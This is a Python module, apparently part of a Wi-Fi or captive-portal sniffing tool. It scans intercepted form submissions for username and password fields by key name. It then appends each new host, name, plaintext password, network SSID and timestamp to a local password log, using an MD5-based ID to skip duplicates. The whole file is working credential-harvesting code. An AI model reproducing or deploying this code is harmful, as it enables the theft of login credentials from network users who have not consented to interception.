import json
import hashlib
import time
import math
from ..config import PROJ_ROOT, PASSWORD_LOG
from ..utils.util import read_settings, safe_read

def check_id(netloc, name, password):
    m = hashlib.md5()
    m.update(netloc.encode() + b"\xff" + name.encode() + b"\xff" + password.encode())
    _id = m.hexdigest()[:16]
    data = safe_read(PROJ_ROOT+PASSWORD_LOG)
    if data == "":
        with open(PROJ_ROOT+PASSWORD_LOG, 'w') as ofile:
            ofile.write("")
        return _id
    elif _id in data:
        return None
    else:
        return _id

def do_sniff(netloc, body):
    if len(body.keys()) == 0:
        return
    name_idx = -1
    password_idx = -1
    keys = list(body.keys())
    for i in range(len(keys)):
        _key = keys[i].lower()
        if name_idx == -1 and ("name" in _key or "mail" in _key or "user" in _key):
            name_idx = i
            continue
        elif password_idx == -1 and ("pass" in _key or "pw" in _key or "secret" in _key):
            password_idx = i
            continue
    got = {}
    name = body[keys[name_idx]] if name_idx != -1 else ""
    password = body[keys[password_idx]] if password_idx != -1 else ""
    _id = check_id(netloc, name, password)
    if _id is None: return
    got['host'] = netloc
    got['name'] = name
    got['password'] = password
    got['id'] = _id
    if name_idx != -1: got['name'] = body[keys[name_idx]]
    if password_idx != -1: got['password'] = body[keys[password_idx]]
    got['ssid'] = read_settings()['ssid']
    got['time'] = math.floor(time.time())
    got['hide'] = 0
    with open(PROJ_ROOT+PASSWORD_LOG, 'a') as ofile:
        ofile.write(json.dumps(got))
        ofile.write("\n")